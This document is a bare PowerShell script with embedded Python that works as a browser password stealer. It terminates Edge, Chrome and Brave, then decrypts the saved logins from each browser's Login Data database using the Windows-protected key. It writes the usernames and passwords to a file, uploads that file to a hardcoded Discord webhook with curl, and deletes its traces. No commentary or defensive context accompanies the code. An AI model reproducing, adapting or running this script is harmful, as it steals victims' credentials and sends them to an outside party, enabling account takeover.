$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

taskkill /F /IM msedge.exe,chrome.exe,brave.exe 2>$null
Start-Sleep 2

$py = @'
import os, json, base64, sqlite3, shutil
try:
    import win32crypt
    from Crypto.Cipher import AES
except:
    os.system("pip install pycryptodome pypiwin32 --quiet")
    import win32crypt
    from Crypto.Cipher import AES

def get_key(path):
    with open(path, "r") as f:
        key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt(enc, key):
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=enc[3:15])
        return cipher.decrypt_and_verify(enc[15:-16], enc[-16:]).decode()
    except:
        return "[ERROR]"

def extract(db, state, name):
    key = get_key(state)
    shutil.copy2(db, "t.db")
    conn = sqlite3.connect("t.db")
    out = []
    for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"):
        out.append(f"[{name}] {row[0]}\nUsername: {row[1]}\nPassword: {decrypt(row[2], key)}\n")
    conn.close()
    os.remove("t.db")
    return out

results = []

# Edge
e_db = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
e_st = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State")
if os.path.exists(e_db):
    results += extract(e_db, e_st, "EDGE")

# Chrome
c_db = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
c_st = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
if os.path.exists(c_db):
    results += extract(c_db, c_st, "CHROME")

# Brave
b_db = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
b_st = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State")
if os.path.exists(b_db):
    results += extract(b_db, b_st, "BRAVE")

if results:
    with open("passwords.txt", "w") as f:
        f.write(f"TOTAL: {len(results)} passwords\n{'='*60}\n\n")
        f.write("\n".join(results))
    print("OK")
else:
    print("NONE")
'@

$py | Out-File "$env:TEMP\d.py" -Encoding UTF8

cd $env:TEMP
$r = python d.py 2>$null

if ($r -eq "OK" -and (Test-Path "passwords.txt")) {
    curl.exe -F "file=@passwords.txt" $wh 2>$null
    Remove-Item "passwords.txt" -Force
}

Remove-Item "d.py" -Force
